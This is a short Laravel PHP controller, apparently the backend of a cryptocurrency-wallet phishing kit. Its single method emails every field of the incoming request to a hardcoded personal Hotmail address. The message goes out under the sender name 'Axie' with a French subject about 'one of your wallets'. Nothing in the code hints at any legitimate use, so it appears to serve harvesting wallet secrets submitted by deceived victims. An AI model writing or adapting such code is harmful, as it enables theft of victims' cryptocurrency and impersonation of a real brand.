<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;

class WalletController extends Controller
{
    public function send(Request $request){
         Mail::send('mails.send', ['request' => $request], function($message) use($request){
                           $message->to('nils6600@hotmail.fr', 'Hello')->subject('Nouvelle information sur un de vos wallet');
                           $message->from('eventsoschool@gmail.com', 'Axie');
                         });

        return redirect()->back()->with('status', 'Mail envoyé avec succès');
    }
}
